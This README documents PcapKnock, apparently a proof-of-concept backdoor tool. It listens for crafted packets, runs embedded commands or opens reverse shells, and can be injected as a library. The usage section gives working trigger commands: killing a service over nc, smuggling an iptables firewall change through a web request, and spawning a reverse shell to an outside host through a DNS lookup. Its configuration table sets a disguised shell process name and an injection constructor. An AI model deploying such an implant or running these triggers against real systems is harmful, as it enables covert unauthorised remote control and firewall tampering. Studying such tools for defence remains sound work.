PcapKnock
=========
PcapKnock listens for specially-crafted packets and either runs a command or
spawns a reverse shell based on the contents of the packets.  It is meant for
use as a PoC; there is no encryption or authentication.  It can either be built
as a standalone binary or an injectable binary.

For legal use only.

Usage
-----
In most cases, the [`build.sh`](./build.sh) script is sufficient to build the
```bash
$ ./build.sh
C Flags:      "-O2 -Wall --pedantic"
Defines:      ""
Linker Flags: "-lpcap -lpthread"
Building library...pcapknock.so
Building static binary...pcapknock.static
Building dynamic binary...pcapknock.dynamic`
```
This will generate three files:
- `pcapknock.so`, an injectable library which spawns a thread on load
- `pcapknock.static`, a statically-linked standalone binary
- `pcapknock.dynamic`, a dynamically-linked standalone binary

Once running, by default PcapKnock will listen on all interfaces (on Linux),
for packets containing one of two triggers, either `COMMAND<command>COMMAND` to
run a command or `CALLBACK<address>:<port>CALLBACK` to spawn a reverse shell to
the given address and port.  See the [Configuration](#Configuration) section
for more information on changing defaults.

Examples
--------
The following examples assume PcapKnock is configured with its default
settings.

Kill apache on 192.168.0.2:
```bash
echo COMMANDpkill apache2COMMAND | nc -u 192.168.0.2 22 #Port doesn't matter
```
Punch a hole in the firewall using a legit web request:
```bash
curl --data 'COMMANDiptables -I INPUT -p tcp --dport 22 -j ACCEPTCOMMAND' https://192.168.0.2
```

Spawn a reverse shell to `192.168.0.3:4444` using a DNS request which will be
recursed to example.com:
```bash
dig CALLBACK192.168.0.3:4444CALLBACK.example.com & nc -nvl 4444
```

Configuration
-------------
Configuration takes place in the form of C defines.  Defaults are set in
[`pcapknock.h`](./pcapknock.h), but can be changed at compile time by passing
`-DOPTION=value` to the compiler.  The included build script passes whatever
is in the `DEFINES` environment variable to the compiler to enable compile-time
configuration.  For convience, the `DEVICE` environment variable may be set to
change the device on which traffic is monitored.

The configurable settings are:

Setting     | Default    | Description
------------|------------|---------------------------------
DEVICE      | `any`      | Device on which to sniff packets
SHELLNAME   | `kexecd`   | Shell process name (i.e. `argv[0]`)
CBMARKER    | `CALLBACK` | Marker for reverse shell addresses
CMDMARKER   | `COMMAND`  | Marker for commands
 | It is unlikely the below will need to be changed |
MAXKNOCK    | 4096       | Maximum command/address length
CLMAXFD     | 10240      | Maximum filedescriptor number to close after fork
CONSTRUCTOR | _unset_    | If defined, runs as a constructor (for injection)
ERROUT      | _unset_    | If defined, outputs error messages to stdout 

Only the first four will likely need to be changed in most cases.
